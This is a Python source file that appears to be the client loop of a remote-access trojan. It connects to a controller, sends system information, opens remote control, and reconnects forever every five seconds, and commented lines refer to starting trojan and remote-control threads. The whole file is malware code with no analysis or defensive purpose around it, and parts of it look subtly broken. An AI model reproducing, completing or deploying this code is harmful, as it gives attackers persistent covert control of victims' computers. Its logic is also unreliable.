import signal
from remoteCommandsClient import *


def main():
    try:
        signal.signal(signal.SIGINT, signalHandler)
        client = clientConnection()
        client.setblocking(True)
        if client == "errore":
            raise Exception
        else:
            time.sleep(5)
            try:
                sendInfo(client)
            except Exception as e:
                raise e

            try:
                time.sleep(5)
                openRemoteControl(client)

            except Exception as e:
                if e.__class__.__name__ == "ConnectionResetError":
                    print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
                    raise e
                raise e

            client.setblocking(False)
            client.send(1024)
            client.close()

    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            raise e
        else:
            raise e


# start trojan
# thread_trojan=Thread(target=trojanBehaviour)
# thread_trojan.start()
# thead_remoteControl=Thread(target=remoteControl)


if __name__ == "__main__":

    while True:
        try:
            main()
        except:
            time.sleep(5)
